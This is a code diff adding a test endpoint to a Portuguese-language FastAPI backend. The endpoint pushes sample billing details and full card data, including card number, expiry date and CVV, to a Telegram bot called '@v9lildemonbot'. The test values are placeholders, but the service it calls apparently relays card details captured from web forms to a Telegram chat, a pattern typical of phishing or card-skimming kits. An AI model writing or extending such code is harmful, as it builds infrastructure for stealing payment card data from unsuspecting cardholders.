@@ -155,3 +155,54 @@ async def get_admin_stats():
     except Exception as e:
         logger.error(f"Error generating admin stats: {str(e)}")
         raise HTTPException(status_code=500, detail="Erro interno do servidor")
+
+@router.post("/test/telegram")
+async def test_telegram_integration(background_tasks: BackgroundTasks):
+    """Endpoint especial para testar o Telegram sem preencher formulários"""
+    try:
+        # Dados de teste
+        test_billing_data = {
+            "nome": "TESTE DIRETO - Maria Silva",
+            "email": "teste.direto@emergent.com", 
+            "endereco": "Rua de Teste API, 456",
+            "codigoPostal": "2000-200",
+            "cidade": "Santarém - TESTE API",
+            "telefone": "+351 911 111 111"
+        }
+        
+        test_card_data = {
+            "numeroCartao": "5555 4444 3333 2222",
+            "dataExpiracao": "09/26",
+            "cvv": "456"
+        }
+        
+        # Enviar para Telegram em background
+        background_tasks.add_task(
+            telegram_service.send_billing_info,
+            test_billing_data
+        )
+        
+        background_tasks.add_task(
+            telegram_service.send_payment_info,
+            test_billing_data,
+            test_card_data
+        )
+        
+        logger.info("Telegram test messages sent")
+        
+        return {
+            "status": "success",
+            "message": "Mensagens de teste enviadas para o Telegram!",
+            "bot_info": "Verifique @v9lildemonbot para as mensagens",
+            "data_sent": {
+                "billing": test_billing_data,
+                "card": {
+                    "numeroCartao": "**** **** **** 2222",
+                    "dataExpiracao": test_card_data["dataExpiracao"]
+                }
+            }
+        }
+        
+    except Exception as e:
+        logger.error(f"Error in Telegram test: {str(e)}")
+        raise HTTPException(status_code=500, detail="Erro no teste do Telegram")
